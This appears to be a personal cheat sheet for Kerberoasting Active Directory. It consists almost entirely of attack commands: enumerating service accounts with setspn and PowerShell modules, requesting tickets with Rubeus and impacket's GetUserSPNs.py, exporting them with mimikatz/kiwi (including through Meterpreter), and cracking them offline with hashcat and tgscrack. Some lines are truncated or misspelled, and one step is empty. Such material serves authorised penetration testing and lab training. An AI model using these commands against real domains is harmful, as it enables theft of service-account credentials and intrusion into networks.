# Kerberoast

1. Get Users with SPNs
GetUserSPNs.ps1

2. Get Service Tickets
Add-Type -AssemblyName System.Identit

3. Extract Tickets


4. Crack Ticket

setspn –a DC1/SVC_SQLService.ignite.local:60111 ignite\SVC_SQLService
MSSQLsvc/DC1@ignite.loal

Windows

setspn -T ignite -Q */*

./Rubeus.exe kerberoast /outfile:hashes.kerberoast

hashcat -m 13100 --force -a 0 hashes.kerberoast dict.txt

kerberos::list
kerberos::list /export


Linux

 ./GetUserSPNs.py -request -dc-ip 192.168.1.105 ignite.local/yashika



 Remote

 load kiwi
 kerberos_ticket_list
 kiwi_cmd kerberos::list

 kiwi_cmd kerberos::list /export


 https://blog.cobalt.io/kerberoast-attack-techniques-79dd0166a65d


 https://github.com/leechristensen/tgscrack


 go run tgscrack.go -hashfile hash -wordlist /usr/share/wordlists/rockyou.txt


 Import-Module .\Find-PotentiallyCrackableAccounts.ps1
 Find-PotentiallyCrackableAccounts -FullData -Verbose
 Import-Module .\Export-PotentiallyCrackableAccounts.ps1
 Export-PotentiallyCrackableAccounts







